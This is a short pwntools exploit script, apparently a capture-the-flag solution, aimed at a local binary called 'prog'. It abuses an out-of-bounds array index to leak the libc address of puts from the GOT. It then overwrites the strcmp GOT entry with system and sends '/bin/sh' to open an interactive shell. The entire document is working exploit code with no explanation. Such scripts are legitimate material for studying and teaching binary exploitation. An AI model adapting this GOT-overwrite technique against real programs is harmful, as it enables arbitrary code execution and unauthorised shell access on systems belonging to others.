from pwn import *

context.clear(arch='amd64')

ref = 'puts'

e = ELF('prog')
n1 = (e.got[ref] - e.sym.ans) // context.bytes + 4
n2 = (e.got.strcmp - e.sym.ans) // context.bytes + 4

l = e.libc
p = e.process()
p.clean()

p.sendline(str(n1))
addr = int(p.readline())
l.address += addr - l.sym[ref]

p.sendline(str(n2))
p.sendline(str(l.sym.system))

p.sendline('/bin/sh\x00')

p.interactive()
